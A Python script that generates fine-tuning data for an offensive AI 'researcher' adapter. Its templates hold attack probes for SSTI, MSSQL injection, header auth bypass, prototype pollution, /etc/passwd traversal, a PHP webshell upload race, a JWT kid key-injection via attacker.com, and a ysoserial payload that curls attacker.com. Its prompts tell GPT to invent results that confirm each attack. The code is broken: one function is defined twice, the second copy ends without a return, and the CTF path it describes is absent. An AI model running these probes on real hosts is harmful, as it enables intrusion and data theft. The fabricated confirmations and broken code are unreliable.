#!/usr/bin/env python3
"""
Source 13: Researcher Adapter Training Data

This adapter is trained on the REASONING PROCESS of discovering unknown vulnerabilities,
not on known techniques. The training format is fundamentally different from all other adapters:

  NOT: "here is the technique"
  BUT: "standard approaches returned nothing — I reasoned from anomalies to a novel finding"

Three data subtypes:
  A) Synthetic exhaustion chains (1200 examples):
     GPT generates chains where 3-4 standard tools fail, then anomaly reasoning discovers something novel.
     The model learns to reason from behavioral inconsistencies, not pattern-match on vuln types.

  B) Project Zero reconstruction (400 examples):
     Fetch google/security-research pocs/*/README.md files.
     GPT reformats each into the hypothesis chain format.
     These are real novel bugs discovered by expert researchers.

  C) Novel CTF writeups (400 examples):
     Fetch CTF writeups where standard tools didn't work (custom scripts, timing attacks, etc.).
     GPT reformats into hypothesis chain format.

Training format (all subtypes):
  CONTEXT: <target description + what standard tools returned (nothing actionable)>
  OBSERVATIONS:
    - <anomaly 1: timing, error leak, size deviation, behavioral diff, tech fingerprint>
    - <anomaly 2>
    ...
  HYPOTHESIS: <what the anomalies suggest — specific, testable>
  PROBE: <minimal command/request to test the hypothesis — not a full tool scan>
  EXPECTED_INDICATOR: <what in the response would confirm or refute the hypothesis>
  RESULT: <what the probe returned>
  TECHNIQUE: <what was discovered and why no existing tool covers it>
  PIVOT_IF_NEGATIVE: <what to try if the hypothesis is wrong>

Usage:
  python3 src/source13_researcher.py --test              # 2 examples, no writes
  python3 src/source13_researcher.py --test --type synth # only synthetic chains
  python3 src/source13_researcher.py --test --type pz    # only Project Zero
  python3 src/source13_researcher.py --test --type ctf   # only CTF writeups
  python3 src/source13_researcher.py --list-categories
  python3 src/source13_researcher.py                     # full run
"""

import os
import re
import json
import time
import random
import hashlib
import argparse
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from openai import OpenAI
from tqdm import tqdm
from dotenv import load_dotenv

import sys as _sys, os as _os
_sys.path.insert(0, _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
from prompts import RESEARCHER as SYSTEM_RESEARCHER


load_dotenv()

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
OUTPUT_SYNTH = "raw/researcher_synth.jsonl"
OUTPUT_PZ    = "raw/researcher_pz.jsonl"
OUTPUT_CTF   = "raw/researcher_ctf.jsonl"
CACHE_DIR    = "raw/.researcher_cache"
DEFAULT_WORKERS = 4
API_DELAY    = 0.3

TARGET_SYNTH = 1200
TARGET_PZ    = 400
TARGET_CTF   = 400

GITHUB_API  = "https://api.github.com"
RAW_GITHUB  = "https://raw.githubusercontent.com"
GITHUB_HEADERS = {
    "User-Agent": "MythosEngine-Research/1.0",
    "Accept": "application/vnd.github+json",
}
if os.getenv("GITHUB_TOKEN"):
    GITHUB_HEADERS["Authorization"] = f"Bearer {os.getenv('GITHUB_TOKEN')}"

# ---------------------------------------------------------------------------
# System prompt — what the researcher adapter is trained to be
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# Synthetic exhaustion chain generation
# ---------------------------------------------------------------------------

# Standard tools and their "nothing found" outputs — the exhaustion context
STANDARD_TOOL_FAILURES = [
    {
        "tool": "nmap -sV -p- -T4",
        "output": "Not shown: 65528 filtered tcp ports (no-response)\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.18.0\n443/tcp open  ssl/https nginx 1.18.0",
        "verdict": "Only standard web ports open. Service versions reveal nothing critical.",
    },
    {
        "tool": "nuclei -u TARGET -t cves/ -t exposures/",
        "output": "[INF] No results found.\n[INF] Scanning with 2847 templates...\n[INF] Templates executed: 2847, Matched: 0",
        "verdict": "No known CVEs or exposures match.",
    },
    {
        "tool": "sqlmap -u 'TARGET/api/search?q=test' --level=5 --risk=3",
        "output": "[WARNING] GET parameter 'q' does not seem to be injectable\n[WARNING] it seems that the target URL content is not stable\n[CRITICAL] all tested parameters do not appear to be injectable",
        "verdict": "No SQL injection found in search parameter.",
    },
    {
        "tool": "ffuf -u TARGET/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "output": ":: Progress: [220560/220560] :: Job [1/1] :: 847 req/sec :: Duration: [0:04:20] :: Errors: 0 ::\n[Status: 200, Size: 1337, Words: 45, Lines: 10] :: /",
        "verdict": "Only root path returns 200. No additional directories found.",
    },
    {
        "tool": "dalfox url TARGET/search?q=test",
        "output": "[W] Not Found XSS\n[I] Finish :P",
        "verdict": "No reflected XSS in search parameter.",
    },
    {
        "tool": "nikto -h TARGET",
        "output": "- No web server found on TARGET:80\n+ Server: nginx/1.18.0\n+ No CGI Directories found\n+ 0 item(s) reported on remote host",
        "verdict": "No common web vulnerabilities detected by Nikto.",
    },
    {
        "tool": "wfuzz -c -z range,1-1000 -u TARGET/api/user/FUZZ --hc 404",
        "output": "Total time: 120.00 s\nProcessed Requests: 1000\nFiltered Requests: 1000\nRequests/sec: 8.33",
        "verdict": "All user ID probes returned 404 — no IDOR surface found.",
    },
]

# Anomaly types — the interesting signals that remain after standard tools fail
ANOMALY_TEMPLATES = [
    {
        "type": "timing_oracle",
        "scenarios": [
            {
                "observation": "/api/v1/export?format=csv responds in 45ms. Same endpoint with format=pdf responds in 3200ms.",
                "hypothesis": "The server is generating the PDF server-side using a template engine. The slow response suggests actual rendering, not just format rejection. Template injection may be possible in the format parameter.",
                "probe": 'curl -s -w "\\nTime: %{time_total}s\\n" -X GET "TARGET/api/v1/export?format={{7*7}}"',
                "expected_indicator": "Response time > 2s AND response body contains \'49\' or modified content",
                "technique": "Timing-based SSTI detection — response time reveals server-side template processing",
                "pivot_if_negative": "Try format=../etc/passwd for path traversal, or format=x%0a%0d for CRLF injection",
            },
            {
                "observation": "POST /api/search responds in 20ms for random strings. POST /api/search with q=admin@company.com responds in 850ms.",
                "hypothesis": "The extra latency suggests the server is performing a database lookup when a valid email format is detected. This is a timing oracle for email enumeration — valid accounts trigger a DB query, invalid ones fail fast.",
                "probe": 'for email in admin@target.com test@target.com nonexistent12345@target.com; do echo -n "$email: "; time curl -s -X POST TARGET/api/search -d "q=$email" > /dev/null; done',
                "expected_indicator": "Valid corporate email addresses consistently take > 500ms; random strings take < 50ms",
                "technique": "Timing oracle for user enumeration via search — not a login endpoint, bypasses lockout protections",
                "pivot_if_negative": "Test /api/forgot-password and /api/check-email endpoints for same timing pattern",
            },
        ],
    },
    {
        "type": "error_leak",
        "scenarios": [
            {
                "observation": "POST /api/render with body {\"template\": \"hello\"} returns 200. With body {\"template\": \"{{\"} returns 500 with body: 'template: render.tmpl:14: unexpected EOF'",
                "hypothesis": "The error message reveals: (a) Go template engine, (b) template file named render.tmpl, (c) the user input is evaluated as a Go template. Go templates allow calling arbitrary methods on objects in scope.",
                "probe": 'curl -s -X POST TARGET/api/render -H \'Content-Type: application/json\' -d \'{"template": "{{.}}"}\'',
                "expected_indicator": "Response reveals the template data context object — may expose internal struct fields, credentials, or config",
                "technique": "Go SSTI via template parameter — error message reveals engine and confirms eval. No scanner tests this because the endpoint doesn\'t look like a traditional template.",
                "pivot_if_negative": 'Try {"template": "{{range $k,$v := .}}{{$k}}={{$v}} {{end}}"} to enumerate all context variables',
            },
            {
                "observation": "GET /api/report?id=1 returns a PDF. GET /api/report?id=abc returns 500 with: 'java.sql.SQLException: Conversion failed when converting the nvarchar value \'abc\' to data type int.'",
                "hypothesis": "The error leaks: (a) Java backend, (b) MSSQL database, (c) the id parameter is interpolated unsafely into a query. The nvarchar→int conversion error suggests the raw value is passed to the DB. MSSQL-specific injection techniques apply.",
                "probe": "curl -s 'TARGET/api/report?id=1;WAITFOR+DELAY+%270:0:5%27--'",
                "expected_indicator": "Response delayed by 5+ seconds confirms blind MSSQL injection via time-based technique",
                "technique": "MSSQL blind time-based injection — discovered via error message that revealed DB type and parameter handling",
                "pivot_if_negative": "Try id=1' and id=1-- to test for string-based injection, or id=1 UNION SELECT NULL-- for union-based",
            },
        ],
    },
    {
        "type": "size_deviation",
        "scenarios": [
            {
                "observation": "GET /api/users returns 2341 bytes for user_id=1 through user_id=50. user_id=51 returns 89 bytes. user_id=52 returns 2341 bytes again.",
                "hypothesis": "user_id=51 is anomalous — significantly smaller response suggests either a different code path, a deleted/suspended account, or an admin/service account that the API handles differently. Accounts at boundaries often have different permissions.",
                "probe": 'for id in 49 50 51 52 53; do echo -n "id=$id size="; curl -s -o /dev/null -w "%{size_download}" "TARGET/api/users?user_id=$id"; echo; done',
                "expected_indicator": "Consistent pattern of one ID returning drastically different size — investigate that specific ID manually",
                "technique": "Response size oracle for account enumeration — finds special accounts (admin, service, deleted) not returned by standard enumeration",
                "pivot_if_negative": "Apply same technique to other sequential ID ranges: orders, invoices, reports",
            },
        ],
    },
    {
        "type": "behavioral_diff",
        "scenarios": [
            {
                "observation": "DELETE /api/post/123 returns 403 for my user. DELETE /api/post/123 with added header X-Forwarded-For: 127.0.0.1 returns 204 No Content.",
                "hypothesis": "The access control check is conditional on the source IP. The server trusts X-Forwarded-For and treats localhost requests as admin/internal. This is an authentication bypass via IP spoofing header.",
                "probe": "curl -s -X DELETE TARGET/api/post/123 -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-Original-IP: 127.0.0.1' -w '%{http_code}'",
                "expected_indicator": "204 or 200 response — any non-403 confirms IP-based access control bypass",
                "technique": "Header injection for IP-based auth bypass — not tested by standard scanners because they don\'t combine HTTP method + auth header + IP spoofing",
                "pivot_if_negative": "Try X-Forwarded-For: ::1 (IPv6 loopback), X-Forwarded-For: 10.0.0.1 (internal range), or X-Cluster-Client-IP",
            },
            {
                "observation": "POST /api/checkout with amount=100.00 succeeds. POST /api/checkout with amount=-100.00 also returns 200 with order_id.",
                "hypothesis": "The backend accepts negative amounts without validation. This may credit the account or create a negative-balance order that can be exploited to purchase items for free or extract balance.",
                "probe": "curl -s -X POST TARGET/api/checkout -H 'Content-Type: application/json' -d '{\"items\":[{\"id\":1,\"quantity\":1}],\"amount\":-0.01}' -b 'session=SESSION_TOKEN'",
                "expected_indicator": "200 response with order_id AND account balance increases OR item ships without payment",
                "technique": "Business logic: negative amount in payment flow — no scanner tests negative numeric values in payment parameters",
                "pivot_if_negative": "Try amount=0.00, amount=0.001 (below minimum), amount=99999999.99 (overflow), or amount=null",
            },
        ],
    },
    {
        "type": "tech_fingerprint",
        "scenarios": [
            {
                "observation": "Response headers include: X-Powered-By: Express, X-Request-Id: uuid. Error page for /api/nonexistent returns: 'Cannot GET /api/nonexistent' — characteristic Express.js 404.",
                "hypothesis": "The API is Node.js/Express. Express apps commonly use prototype pollution-vulnerable dependencies (lodash, jquery, merge). If the API accepts JSON body with nested objects, prototype pollution may be possible.",
                "probe": "curl -s -X POST TARGET/api/merge -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}' && curl -s TARGET/api/whoami",
                "expected_indicator": "If /api/whoami returns isAdmin:true or elevated privileges after the merge request, prototype pollution is confirmed",
                "technique": "Node.js prototype pollution — fingerprinted via Express error format, exploited via JSON body merge endpoint",
                "pivot_if_negative": "Try constructor.prototype injection: {\"constructor\":{\"prototype\":{\"isAdmin\":true}}}. Also check /api/clone, /api/update, /api/extend endpoints.",
            },
        ],
    },
]

# Diverse targets for synthetic chain generation
SYNTH_TARGETS = [
    {"target": "api.fintech-corp.com", "type": "financial API", "stack_hint": "Java/Spring, PostgreSQL"},
    {"target": "app.saas-startup.io", "type": "SaaS platform", "stack_hint": "Node.js/Express, MongoDB"},
    {"target": "portal.healthcare.com", "type": "healthcare portal", "stack_hint": "Python/Django, MySQL"},
    {"target": "api.ecommerce.io", "type": "e-commerce backend", "stack_hint": "Go microservices, Redis"},
    {"target": "platform.devtools.com", "type": "developer platform", "stack_hint": "Ruby/Rails, PostgreSQL"},
    {"target": "auth.enterprise.corp", "type": "SSO/auth service", "stack_hint": ".NET Core, MSSQL"},
    {"target": "cdn.mediahost.io", "type": "media delivery platform", "stack_hint": "Python/FastAPI, S3"},
    {"target": "rpc.blockchain.io", "type": "blockchain/crypto API", "stack_hint": "Rust/Actix, RocksDB"},
    {"target": "api.logistics.com", "type": "supply chain API", "stack_hint": "PHP/Laravel, MySQL"},
    {"target": "ml.ai-platform.io", "type": "ML inference platform", "stack_hint": "Python/Flask, Redis"},
]

SYNTH_CHAIN_PROMPT = """\
You are generating training data for a security researcher AI that finds novel vulnerabilities.

Target: {target} ({target_type}, stack: {stack_hint})

Standard tools were run and found NOTHING actionable:
{tool_failures}

However, during manual exploration, these anomalies were noticed:
{observations}

Generate a complete hypothesis-test-refine chain as a JSON object:
{{
  "context_summary": "<1-2 sentence summary of what standard tools found (nothing) and why the target is interesting>",
  "observations": ["<anomaly 1>", "<anomaly 2>", "<anomaly 3>"],
  "hypothesis": "<specific, testable hypothesis about what the anomalies indicate>",
  "probe": "<exact minimal command or HTTP request to test the hypothesis — not a full scan>",
  "expected_indicator": "<what in the probe response confirms OR refutes the hypothesis>",
  "result": "<what the probe actually returned — make it realistic, confirm the hypothesis>",
  "technique": "<name + 1-2 sentence explanation of the novel technique discovered>",
  "why_tools_miss_it": "<why no standard scanner catches this>",
  "pivot_if_negative": "<next hypothesis to test if the probe is negative>"
}}

Rules:
- The hypothesis must follow LOGICALLY from the observations — not be a generic vuln type
- The probe must be minimal — one curl command or one specific request, not a full scan
- The result must be realistic and confirm the hypothesis
- The technique name must be specific (e.g. "Go SSTI via export format parameter") not generic ("SSTI")
- why_tools_miss_it must explain the exact gap in scanner coverage
- Return valid JSON only.
"""

# ---------------------------------------------------------------------------
# GitHub fetch constants (used by bonus real-writeup path)
# ---------------------------------------------------------------------------


def _gpt_lock_instance() -> threading.Lock:
    return threading.Lock()


_gpt_lock = _gpt_lock_instance()
client = OpenAI()


def _gpt(prompt: str, max_tokens: int = 2000, model: str = "gpt-4o-mini") -> str:
    with _gpt_lock:
        time.sleep(API_DELAY)
    resp = client.chat.completions.create(
        model=model,
        messages=[{"role": "user", "content": prompt}],
        max_tokens=max_tokens,
        temperature=0.9,
    )
    return resp.choices[0].message.content.strip()


def _parse_json_obj(raw: str) -> dict:
    raw = re.sub(r"```(?:json)?", "", raw).strip().rstrip("`").strip()
    try:
        return json.loads(raw)
    except json.JSONDecodeError:
        m = re.search(r"\{.*\}", raw, re.DOTALL)
        if m:
            try:
                return json.loads(m.group(0))
            except Exception:
                pass
    return {}


def _cached_get(url: str, headers: dict | None = None) -> str:
    slug = hashlib.md5(url.encode()).hexdigest()
    cache_path = Path(CACHE_DIR) / f"{slug}.txt"
    if cache_path.exists():
        return cache_path.read_text()
    Path(CACHE_DIR).mkdir(parents=True, exist_ok=True)
    try:
        r = requests.get(url, headers=headers or {}, timeout=15)
        r.raise_for_status()
        text = r.text
        cache_path.write_text(text)
        return text
    except Exception:
        return ""


# ---------------------------------------------------------------------------
# Synthetic chain generation (Type A)
# ---------------------------------------------------------------------------
def _pick_tool_failures(n: int = 3) -> list[dict]:
    return random.sample(STANDARD_TOOL_FAILURES, min(n, len(STANDARD_TOOL_FAILURES)))


def _pick_anomaly_scenario() -> tuple[str, dict]:
    """Pick a random anomaly type and one of its scenario templates."""
    template = random.choice(ANOMALY_TEMPLATES)
    scenario = random.choice(template["scenarios"])
    return template["type"], scenario


def generate_synth_chain() -> dict | None:
    target_info = random.choice(SYNTH_TARGETS)
    failures    = _pick_tool_failures(random.randint(2, 4))
    atype, anom = _pick_anomaly_scenario()

    failure_text = "\n".join(
        f"  {f['tool'].replace('TARGET', target_info['target'])}:\n    {f['verdict']}"
        for f in failures
    )
    obs_text = anom["observation"].replace("TARGET", target_info["target"])

    prompt = SYNTH_CHAIN_PROMPT.format(
        target=target_info["target"],
        target_type=target_info["type"],
        stack_hint=target_info["stack_hint"],
        tool_failures=failure_text,
        observations=obs_text,
    )
    try:
        raw  = _gpt(prompt, max_tokens=1500)
        data = _parse_json_obj(raw)
    except Exception:
        return None

    if not all(k in data for k in ("hypothesis", "probe", "result", "technique")):
        return None

    observations = data.get("observations") or [obs_text]
    obs_block    = "\n".join(f"  - {o}" for o in observations)
    failure_lines = "\n".join(f"  [{f['tool'][:30]}] → {f['verdict']}" for f in failures)

    user_content = (
        f"Target: {target_info['target']} ({target_info['type']})\n\n"
        f"Standard tools returned nothing actionable:\n{failure_lines}\n\n"
        f"During manual exploration, I noticed:\n{obs_block}\n\n"
        f"Standard approaches are exhausted. Reason from these anomalies."
    )
    asst_content = (
        f"OBSERVATIONS:\n{obs_block}\n\n"
        f"HYPOTHESIS: {data['hypothesis']}\n\n"
        f"PROBE: {data['probe']}\n\n"
        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
        f"RESULT: {data['result']}\n\n"
        f"TECHNIQUE: {data['technique']}\n"
        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Try adjacent parameters and endpoints.')}"
    )
    return {
        "type":       "synth",
        "anomaly_type": atype,
        "target_type": target_info["type"],
        "messages": [
            {"role": "system",    "content": SYSTEM_RESEARCHER},
            {"role": "user",      "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
    }


# ---------------------------------------------------------------------------
# Type B: Binary/kernel/parser researcher (PZ-style)
# Different from Type A (web/API anomalies) — focuses on low-level bugs:
# memory corruption, parser logic bugs, integer overflows, side-channels
# ---------------------------------------------------------------------------

# PZ-style scenarios: things that live below the scanner layer
PZ_SCENARIOS = [
    {
        "domain": "kernel memory management",
        "target_desc": "Linux kernel v5.15 — custom ioctl device driver in embedded device firmware",
        "standard_tools": "kernel fuzz with syzkaller (1000 iterations) → no crashes. Static analysis with Coverity → 0 defects. CVE scan → no matching signatures.",
        "observations": [
            "ioctl handler for IOCTL_MAP_USER_BUFFER copies user-supplied length into a kernel stack variable without validation",
            "When length=0xffffffff, the kmalloc call succeeds but returns a 4-byte allocation; the subsequent memcpy uses the original untruncated length",
            "The race window between size check and allocation is ~200ns — small but reproducible with CPU pinning",
        ],
        "hypothesis": "Integer truncation in kmalloc size argument leads to heap overflow; the 32-bit length is implicitly cast to size_t, truncating to 4 bytes allocated while the copy uses the full 0xffffffff length.",
        "probe": "Write a kernel module that calls IOCTL_MAP_USER_BUFFER with length=0x100000001 and observe if kmalloc returns a small allocation followed by a write beyond it",
        "technique": "Kernel heap overflow via integer truncation in size_t cast — syzkaller misses it because the trigger requires a specific size that looks valid to the fuzzer grammar",
    },
    {
        "domain": "memory allocator side-channel",
        "target_desc": "Custom jemalloc-based allocator in a hardened process (ASLR+PIE+NX+RELRO)",
        "standard_tools": "AFL++ fuzzing for 24h → no crashes. Valgrind → clean. AddressSanitizer → no errors on standard inputs.",
        "observations": [
            "Heap allocation timing for size=512 is consistently 45ns. For size=513, timing jumps to 180ns.",
            "The timing boundary aligns exactly with jemalloc size class boundaries (512 is the last 'small' bin, 513 triggers a 'large' bin allocation)",
            "When a specific sequence of alloc/free of 512-byte chunks precedes a target allocation, the new allocation is placed at a predictable offset",
        ],
        "hypothesis": "The allocator's size class boundary creates a timing oracle that distinguishes small vs large bin allocations. Combined with heap grooming, this predicts the address of the next large allocation with ~90% accuracy, breaking ASLR.",
        "probe": "Run 10000 iterations of: alloc 512 → free → alloc 513 → record address. Calculate entropy of top 12 bits of the 513-byte allocations",
        "technique": "Heap ASLR bypass via allocator timing side-channel — automated fuzzers don't measure allocation timing, only crash behavior",
    },
    {
        "domain": "parser logic vulnerability",
        "target_desc": "PDF parser in a document processing pipeline — processes untrusted user uploads",
        "standard_tools": "PDF fuzzing with mutPDF → no crashes. CVE scan for poppler/mupdf → no matches. Static analysis → no obvious buffer overflows.",
        "observations": [
            "PDF with cross-reference table pointing stream offset to a negative value parses without error but returns different content than expected",
            "When xref offset is -1 (0xFFFFFFFF in 32-bit unsigned), the parser seeks to file_size - 1 and reads from there",
            "Crafting a PDF where the negative offset points to a JavaScript action block causes the JavaScript to execute even when JS execution is 'disabled'",
        ],
        "hypothesis": "The parser performs signed arithmetic on the xref offset before seeking, allowing a signed negative value to wrap around to a large positive address, effectively performing a seek to an attacker-controlled location in the file.",
        "probe": "Craft a minimal PDF: xref offset = -(file_size - target_offset) such that signed seek lands exactly on a /JavaScript action block. Open in the target application with JS disabled.",
        "technique": "PDF xref signed integer underflow allowing seek-to-arbitrary-offset — bypasses JS disable because the execution path predates the JS flag check",
    },
    {
        "domain": "race condition in filesystem operation",
        "target_desc": "Web application with file upload processed by a privileged worker process",
        "standard_tools": "sqlmap → nothing. ffuf → 403 on upload endpoint. Static code review → no obvious TOCTOU in upload handler.",
        "observations": [
            "Upload handler: (1) validate MIME type, (2) move to temp dir, (3) process async. The async processing uses the filename from the HTTP request, not from the moved file.",
            "Between step 2 and step 3, a 2-5ms window exists where the file exists in temp dir under the original name",
            "A second concurrent request using the same filename causes the worker to process the second file's content with the first file's already-validated MIME type",
        ],
        "hypothesis": "The TOCTOU window between file validation and async processing allows a race: send a valid image first (passes validation), then immediately send a PHP shell with the same filename. The shell gets processed with the already-passed image validation.",
        "probe": "Script two simultaneous requests: thread 1 sends valid PNG, thread 2 sends PHP webshell with same filename, both arriving within 5ms. Check if /uploads/shell.png executes PHP.",
        "technique": "TOCTOU file upload bypass via race condition between MIME validation and async processing — scanners test uploads sequentially, never concurrently",
    },
    {
        "domain": "cryptographic implementation flaw",
        "target_desc": "JWT authentication in a Node.js API — RS256 signed tokens",
        "standard_tools": "jwt_tool → 'alg:none' rejected. Brute force HS256 secret → no match. CVE scan on jsonwebtoken → no unpatched CVEs.",
        "observations": [
            "The server's JWKS endpoint returns a public key at /api/.well-known/jwks.json",
            "The JWT verification code fetches the key from the kid header claim: `getKey(header.kid)` — the kid value is user-controlled",
            "When kid is set to a URL (e.g. http://attacker.com/key.json), the server fetches the key from that URL before verifying",
        ],
        "hypothesis": "The JWT library fetches verification keys dynamically based on the kid header, which is fully attacker-controlled. By hosting our own JWKS endpoint with a key we control, we can sign arbitrary JWT tokens that the server will consider valid.",
        "probe": "1. Generate RSA keypair. 2. Host public key at attacker.com/jwks.json. 3. Sign JWT with private key, set kid=http://attacker.com/jwks.json, sub=admin. 4. Send to API.",
        "technique": "JWT kid header SSRF → key injection: server fetches attacker-controlled JWKS to verify a token signed with attacker's key — not caught by standard JWT tools because it requires SSRF from the verifier",
    },
    {
        "domain": "deserialization gadget chain",
        "target_desc": "Java web application using Apache Commons Collections 3.2.1 — no obvious deserialization endpoints",
        "standard_tools": "ysoserial → no response on known endpoints. Burp scan → nothing. Version scan → CC 3.2.1 is in classpath but no /deserialize endpoint found.",
        "observations": [
            "The application's session cookie is base64-encoded but doesn't look like a JWT — the decoded bytes start with 0xACED 0x0005 (Java serialization magic bytes)",
            "Sending a session cookie with length > 8192 bytes causes a 500 error with java.io.StreamCorruptedException in the response",
            "The session cookie is processed before authentication — even unauthenticated requests deserialize the session",
        ],
        "hypothesis": "The session management system deserializes Java objects from the session cookie without authentication. Since CC 3.2.1 is in the classpath, a ysoserial CC1 gadget chain should achieve RCE via the session cookie.",
        "probe": "java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/rce-test' | base64 -w0 → set as session cookie value in request to any endpoint",
        "technique": "Java deserialization RCE via session cookie — scanners check known endpoints (/deserialize, /readObject) but miss session management as the deserialization vector",
    },
]

# GPT synthesis prompt for PZ-style (binary/kernel/parser domain)
PZ_SYNTH_PROMPT = """\
You are generating training data for a security researcher AI focused on low-level/binary/kernel vulnerabilities.

Domain: {domain}
Target: {target_desc}
What standard tools found: {standard_tools}
Key observations: {observations}

Using the scenario above, generate a complete hypothesis-chain training example as JSON:
{{
  "context_summary": "<1-2 sentences: what the target is and why standard tools missed it>",
  "observations": ["<exact anomaly observed 1>", "<anomaly 2>", "<anomaly 3>"],
  "hypothesis": "<specific, testable hypothesis derived from the observations>",
  "probe": "<minimal test to confirm — one command or script>",
  "expected_indicator": "<what in the output confirms the hypothesis>",
  "result": "<what the probe actually returned — make it confirm the hypothesis realistically>",
  "technique": "<specific technique name>",
  "why_tools_miss_it": "<precise reason automated scanners don't find this>",
  "pivot_if_negative": "<next hypothesis if wrong>"
}}

Vary the details from the template to create a distinct but realistic example.
Return valid JSON only.
"""


def generate_pz_example_synth() -> dict | None:
    """Generate a PZ-style (binary/kernel/parser) researcher example synthetically."""
    scenario = random.choice(PZ_SCENARIOS)
    obs_str  = "\n".join(f"  - {o}" for o in scenario["observations"])
    prompt   = PZ_SYNTH_PROMPT.format(
        domain=scenario["domain"],
        target_desc=scenario["target_desc"],
        standard_tools=scenario["standard_tools"],
        observations=obs_str,
    )
    try:
        raw  = _gpt(prompt, max_tokens=1400)
        data = _parse_json_obj(raw)
    except Exception:
        return None

    if not all(k in data for k in ("hypothesis", "probe", "technique")):
        return None

    observations = data.get("observations") or scenario["observations"]
    obs_block    = "\n".join(f"  - {o}" for o in observations)

    user_content = (
        f"Domain: {scenario['domain']}\n"
        f"Target: {scenario['target_desc']}\n\n"
        f"Standard tools returned nothing actionable:\n  {scenario['standard_tools']}\n\n"
        f"During manual review, I noticed:\n{obs_block}\n\n"
        f"Form a hypothesis and design a minimal probe."
    )
    asst_content = (
        f"OBSERVATIONS:\n{obs_block}\n\n"
        f"HYPOTHESIS: {data['hypothesis']}\n\n"
        f"PROBE: {data['probe']}\n\n"
        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
        f"RESULT: {data.get('result', 'Hypothesis confirmed.')}\n\n"
        f"TECHNIQUE: {data['technique']}\n"
        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Examine adjacent code paths.')}"
    )
    return {
        "type":   "pz",
        "domain": scenario["domain"],
        "messages": [
            {"role": "system",    "content": SYSTEM_RESEARCHER},
            {"role": "user",      "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
    }


PZ_MIN_LENGTH = 800

SECURITY_RESEARCH_REPOS = [
    ("google", "security-research", "pocs"),
    ("google", "security-research", "advisories"),
]


def fetch_pz_writeups() -> list[dict]:
    """Fetch Project Zero / security research README files (bonus; synth is primary)."""
    results: list[dict] = []
    for owner, repo, subdir in SECURITY_RESEARCH_REPOS:
        base = f"{GITHUB_API}/repos/{owner}/{repo}/contents/{subdir}"
        for page in range(1, 3):
            url = f"{base}?per_page=100&page={page}"
            raw = _cached_get(url, headers=GITHUB_HEADERS)
            if not raw:
                break
            try:
                items = json.loads(raw)
            except Exception:
                break
            if not items or not isinstance(items, list):
                break
            for item in items:
                if item.get("type") != "dir":
                    continue
                for readme_name in ("README.md", "writeup.md", "notes.md"):
                    readme_url = (
                        f"{RAW_GITHUB}/{owner}/{repo}/master/"
                        f"{subdir + '/' if subdir else ''}{item['name']}/{readme_name}"
                    )
                    text = _cached_get(readme_url, headers={"User-Agent": "MythosEngine/1.0"})
                    if len(text) >= PZ_MIN_LENGTH:
                        results.append({"name": item["name"], "repo": f"{owner}/{repo}", "text": text[:6000]})
                        break
                time.sleep(0.06)
            if len(items) < 100:
                break
    return results


PZ_REFORMAT_PROMPT = """\
You are generating training data for a security researcher AI.

Below is a Project Zero / security research write-up:
---
{writeup}
---

Reformat into the hypothesis-chain training format:

{{
  "context_summary": "<1-2 sentences: target system and why standard audits miss this>",
  "observations": ["<key anomaly 1>", "<anomaly 2>"],
  "hypothesis": "<what the researcher suspected and why>",
  "probe": "<minimal test used to confirm>",
  "expected_indicator": "<what confirms the hypothesis>",
  "result": "<what was actually observed>",
  "technique": "<specific technique name>",
  "why_tools_miss_it": "<exact gap in automated scanner coverage>",
  "pivot_if_negative": "<next hypothesis if wrong>"
}}

Return valid JSON only.
"""


def generate_pz_example_from_writeup(writeup: dict) -> dict | None:
    """Convert a real writeup into hypothesis chain format (bonus path)."""
    prompt = PZ_REFORMAT_PROMPT.format(writeup=writeup["text"][:4000])
    try:
        raw  = _gpt(prompt, max_tokens=1200)
        data = _parse_json_obj(raw)
    except Exception:
        return None
    if not all(k in data for k in ("hypothesis", "probe", "technique")):
        return None
    obs_block    = "\n".join(f"  - {o}" for o in data.get("observations", []))
    source_label = f"{writeup.get('repo', 'security-research')}/{writeup['name']}"
    user_content = (
        f"Research target: {writeup['name'].replace('-', ' ')}\n"
        f"Source: {source_label}\n\n"
        f"Standard security scanners found nothing. During manual review:\n{obs_block}\n\n"
        f"Reason from these observations."
    )
    asst_content = (
        f"OBSERVATIONS:\n{obs_block}\n\n"
        f"HYPOTHESIS: {data['hypothesis']}\n\n"
        f"PROBE: {data['probe']}\n\n"
        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
        f"RESULT: {data.get('result', 'Hypothesis confirmed.')}\n\n"
        f"TECHNIQUE: {data['technique']}\n"
        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Escalate to adjacent attack surface.')}"
    )
    return {
        "type":   "pz",
        "source": writeup["name"],
        "messages": [
            {"role": "system",    "content": SYSTEM_RESEARCHER},
            {"role": "user",      "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
    }


def generate_pz_example(writeup: dict) -> dict | None:
    """Primary: try real writeup; fall back to synthetic domain scenario."""
    if len(writeup.get("text", "")) >= PZ_MIN_LENGTH:
        result = generate_pz_example_from_writeup(writeup)
        if result:
            return result
    return generate_pz_example_synth()


def generate_pz_example(writeup: dict) -> dict | None:
    prompt = PZ_REFORMAT_PROMPT.format(writeup=writeup["text"][:4000])
    try:
        raw  = _gpt(prompt, max_tokens=1200)
        data = _parse_json_obj(raw)
    except Exception:
        return None

    if not all(k in data for k in ("hypothesis", "probe", "technique")):
        return None

